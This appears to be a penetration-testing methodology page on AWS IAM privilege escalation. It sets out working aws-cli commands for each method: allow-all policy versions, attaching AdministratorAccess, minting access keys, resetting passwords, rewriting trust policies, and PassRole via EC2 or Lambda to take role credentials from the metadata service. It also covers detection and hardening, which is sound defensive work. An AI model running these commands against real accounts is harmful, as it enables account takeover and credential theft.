---
cstg_id: CSTG-AWS-IAM-PRIVESC
title: "AWS Iam - Privilege Escalation"
provider: aws
service: iam
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - iam:CreatePolicyVersion
  - iam:SetDefaultPolicyVersion
  - iam:AttachUserPolicy
  - iam:AttachGroupPolicy
  - iam:AttachRolePolicy
  - iam:PutUserPolicy
  - iam:PutGroupPolicy
  - iam:PutRolePolicy
  - iam:AddUserToGroup
  - iam:CreateAccessKey
  - iam:CreateLoginProfile
  - iam:UpdateLoginProfile
  - iam:UpdateAssumeRolePolicy
  - iam:PassRole
  - sts:AssumeRole
tools:
  - aws-cli
  - principal-mapper (pmapper)
  - pacu
  - aws-iam-policy-simulator
references:
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://github.com/RhinoSecurityLabs/pacu"
license: CC BY-SA 4.0
---

## Summary

IAM privilege escalation is the act of leveraging a permission already held by a compromised principal to obtain permissions it was not intended to have - typically culminating in administrative control of the account. Because IAM is fully self-referential (IAM permissions can grant, modify, or assume other IAM identities), a single seemingly-narrow permission such as `iam:CreatePolicyVersion` or `iam:PassRole` can be enough to reach `AdministratorAccess`.

The attacker objective is to identify which of the currently-held permissions enables an escalation primitive and then execute it. This page is organized as one subsection per escalation-enabling permission, each describing the path, the exact API/CLI calls, and the resulting privilege gain. The catalogue follows the widely-documented set of AWS privilege-escalation methods. Enumeration from [IAM Enumeration](../02-services/aws-iam-enum.md) should be completed first to know which of these permissions the principal holds.

## Prerequisites

- An assumed-breach foothold: valid credentials for a non-administrative principal (user or role).
- One or more of the escalation-enabling permissions listed in the subsections below, with a resource scope (`"Resource": "*"` or a resource the path can target) that does not block the action.
- For any `PassRole`-based path, an existing service-linked or service role with higher privilege that the principal is permitted to pass, plus permission to create or update the consuming resource (EC2, Lambda, Glue, CloudFormation, etc.).
- Knowledge of the target principals/roles to escalate into (from prior enumeration).

A quick confirmation of whether a path is permitted before attempting it:

```bash
aws iam simulate-principal-policy \
  --policy-source-arn <your-principal-arn> \
  --action-names iam:CreatePolicyVersion iam:PassRole sts:AssumeRole
```

## Misconfigurations & Findings

- A non-admin principal holds any of the permissions enumerated below with `"Resource": "*"`.
- `iam:PassRole` granted with `"Resource": "*"` rather than scoped to specific role ARNs - the single most common enabler of compute-based escalation.
- Policies attachable by the principal include `AdministratorAccess` or other powerful managed policies.
- Roles whose trust policy allows the compromised principal (directly, via `root`, or via wildcard) to call `sts:AssumeRole`.
- Group or policy version permissions that let a user grant itself rights indirectly.

## Exploitation

### iam:CreatePolicyVersion

If the principal can create a new version of a customer-managed policy that is attached to it (or to a group/role it controls), it can write an administrator policy document and make it the default - no separate `SetDefaultPolicyVersion` needed because `--set-as-default` does it inline.

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::<acct>:policy/<attached-policy> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

### iam:SetDefaultPolicyVersion

If a policy already has multiple versions and one of the non-default versions is more permissive, the principal can promote it without creating anything:

```bash
aws iam list-policy-versions --policy-arn <arn>
aws iam set-default-policy-version --policy-arn <arn> --version-id v2
```

### iam:AttachUserPolicy / iam:AttachGroupPolicy / iam:AttachRolePolicy

Attach a powerful managed policy directly to a controlled principal:

```bash
aws iam attach-user-policy  --user-name  <self> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-group-policy --group-name <grp>  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-role-policy  --role-name  <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### iam:PutUserPolicy / iam:PutGroupPolicy / iam:PutRolePolicy

Embed an inline allow-all policy on a controlled principal. Inline policies are equally authoritative and are easy to overlook in monitoring:

```bash
aws iam put-user-policy --user-name <self> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### iam:AddUserToGroup

If a more-privileged group exists, add the controlled user to it:

```bash
aws iam add-user-to-group --group-name <privileged-group> --user-name <self>
```

### iam:CreateAccessKey

Mint a long-term access key for a more-privileged user the principal can target, then authenticate as that user:

```bash
aws iam create-access-key --user-name <privileged-user>
# Use the returned AccessKeyId / SecretAccessKey as the privileged identity.
```

### iam:CreateLoginProfile

Create a console password for a privileged user that has none, then sign in to the console as them:

```bash
aws iam create-login-profile --user-name <privileged-user> \
  --password '<P@ssw0rd>' --no-password-reset-required
```

### iam:UpdateLoginProfile

Reset the console password of an existing privileged user to a value the attacker controls:

```bash
aws iam update-login-profile --user-name <privileged-user> \
  --password '<P@ssw0rd>' --no-password-reset-required
```

### iam:UpdateAssumeRolePolicy (with sts:AssumeRole)

Rewrite the trust policy of a privileged role so the compromised principal may assume it, then assume it:

```bash
aws iam update-assume-role-policy --role-name <privileged-role> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"<my-arn>"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<privileged-role> --role-session-name x
```

### iam:PassRole + ec2:RunInstances

Launch an EC2 instance with a privileged instance-profile role attached, then retrieve that role's credentials from the instance metadata service:

```bash
aws ec2 run-instances --image-id <ami> --instance-type t3.micro \
  --iam-instance-profile Name=<privileged-instance-profile> \
  --key-name <kp> --user-data file://exfil.sh
# On the instance: curl IMDSv2 token, then
#   http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

### iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction

Create a Lambda with a privileged execution role and invoke it to run arbitrary calls as that role:

```bash
aws lambda create-function --function-name esc --runtime python3.12 \
  --role arn:aws:iam::<acct>:role/<privileged-role> \
  --handler index.handler --zip-file fileb://f.zip
aws lambda invoke --function-name esc out.json
```

The same `PassRole` primitive applies to Glue dev endpoints/jobs, CloudFormation stacks, SageMaker notebooks, Data Pipeline, CodeBuild, and any service that runs with a passed role - each is a variant of the same escalation.

### sts:AssumeRole

If a privileged role's existing trust policy already permits the compromised principal, simply assume it - no IAM write required:

```bash
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<privileged-role> --role-session-name x
```

### iam:CreateRole / iam:AttachRolePolicy / iam:PassRole chains

Where the principal can create a new role, attach an admin policy, and pass it to a service it controls, the three combine into a full escalation even when no single privileged role pre-exists.

## Detection & Logging

- **CloudTrail** (global IAM events in `us-east-1`) is the primary source. Each path produces a distinctive event: `CreatePolicyVersion`, `SetDefaultPolicyVersion`, `AttachUserPolicy`/`AttachGroupPolicy`/`AttachRolePolicy`, `PutUserPolicy`/`PutRolePolicy`, `AddUserToGroup`, `CreateAccessKey`, `CreateLoginProfile`, `UpdateLoginProfile`, and `UpdateAssumeRolePolicy`.
- `PassRole`-based paths are visible as `RunInstances`, `CreateFunction`/`Invoke`, `CreateStack`, etc., where the `requestParameters` reference a role more privileged than the caller; correlate the `PassRole` authorization with the consuming service event.
- High-signal correlation: a non-admin principal performing an IAM write against *itself* (for example `AttachUserPolicy` where `userName` equals the caller) or `AdministratorAccess` appearing in any `policyArn`.
- `sts:AssumeRole` immediately following an `UpdateAssumeRolePolicy` on the same role is a strong escalation indicator.
- **GuardDuty** raises `PrivilegeEscalation:IAMUser/AdministrativePermissions` and anomalous-behavior findings for these patterns.

## Remediation & Hardening

- Never grant the escalation permissions above to non-administrative principals; treat `iam:Create*`, `iam:Attach*`, `iam:Put*`, `iam:Update*`, and `iam:Set*` as administrative.
- Scope `iam:PassRole` to specific role ARNs and add an `iam:PassedToService` condition; never use `"Resource": "*"`.
- Use permission boundaries and Service Control Policies (SCPs) to cap the maximum privilege any principal can reach, so even a successful attach/put cannot exceed the boundary.
- Disable unused console access and access keys; prefer short-lived federated sessions.
- Restrict trust policies to specific principals with conditions; review `UpdateAssumeRolePolicy` calls.
- Alert on the CloudTrail events above and run `pmapper`/`cloudsplaining` regularly to find these combinations before an attacker does.

## Tools

- **aws-cli** - executes every path above.
- **principal-mapper (pmapper)** - `query 'preset privesc *'` enumerates exactly which principals can escalate and how.
- **pacu** - includes IAM privilege-escalation enumeration and exploitation modules covering the methods listed here.
- **aws-iam-policy-simulator** - confirms whether a given path is permitted before execution.

## References

- Rhino Security Labs - AWS privilege escalation methods and mitigation
- AWS IAM User Guide - Granting a user permissions to pass a role (PassRole)
- AWS IAM User Guide - Managed policy versioning
- hackingthe.cloud - IAM privilege escalation
- Rhino Security Labs - Pacu
